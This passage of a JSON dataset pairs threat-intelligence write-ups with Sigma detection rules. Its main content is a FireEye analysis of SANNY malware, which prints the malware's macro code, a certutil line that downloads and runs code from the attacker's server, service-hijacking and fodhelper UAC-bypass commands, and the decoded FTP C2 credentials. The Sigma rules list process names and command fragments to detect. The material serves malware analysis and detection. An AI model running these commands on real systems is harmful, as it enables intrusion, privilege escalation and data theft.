Defense Evasion (TA0005) |\n| ATT&CK Technique  | Valid Accounts (T1078) |\n| Severity          | Informational |\n\n## Description\n\nA dormant user account tried to authenticate to a service using a TGS, after having been unused for a year or more. This may indicate the account is misused by an attacker.\n\n## Attacker's Goals\n\nUse a compromised user account which has not been used in a long time, and therefore less likely to be noticed.\n\n## Investigative actions\n\n- See whether the service authentication was successful.\n- Confirm that the activity is benign (e.g. the user returned from a long leave of absence).\n- Check whether you have issues with your Cloud Identity Engine failing to sync data from Active Directory.\n\n## Variations\n\n### Authentication Attempt From a Dormant Account to a sensitive server\n\n#### Synopsis\n\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Valid Accounts (T1078) |\n| Severity          | Low |\n\n#### Description\n\nA dormant user account tried to authenticate to a service using a TGS, after having been unused for a year or more. This may indicate the account is misused by an attacker on a sensitive server.\n\n#### Attacker's Goals\n\nUse a compromised user account which has not been used in a long time, and therefore less likely to be noticed.\n\n#### Investigative actions\n\n- See whether the service authentication was successful.\n- Confirm that the activity is benign (e.g. the user returned from a long leave of absence).\n- Check whether you have issues with your Cloud Identity Engine failing to sync data from Active Directory.",
    "sigma_rule": {
      "title": "Script Event Consumer Spawning Process",
      "id": "f6d1dd2f-b8ce-40ca-bc23-062efb686b34",
      "status": "test",
      "description": "Detects a suspicious child process of Script Event Consumer (scrcons.exe).",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-data-source/Scrcons.exe-Rare-Child-Process"
      ],
      "author": "Sittikorn S",
      "date": "2021-06-21",
      "modified": "2022-07-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\scrcons.exe",
          "Image|endswith": [
            "\\svchost.exe",
            "\\dllhost.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\wscript.exe",
            "\\cscript.exe",
            "\\schtasks.exe",
            "\\regsvr32.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\msiexec.exe",
            "\\msbuild.exe"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_scrcons_susp_child_process.yml",
    "id": "486"
  },
  {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab > nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "Suspicious Service Path Modification",
      "id": "138d3531-8793-4f50-a2cd-f291b2863d78",
      "status": "test",
      "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Victor Sergeev, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-21",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "config",
            "binPath"
          ],
          "CommandLine|contains": [
            "powershell",
            "cmd ",
            "mshta",
            "wscript",
            "cscript",
            "rundll32",
            "svchost",
            "dllhost",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "cmd /c",
            "cmd /k",
            "cmd /r",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sc_service_path_modification.yml",
    "id": "492"
  },
  {
    "url": "https://twitter.com/0gtweet/status/1457676633809330184",
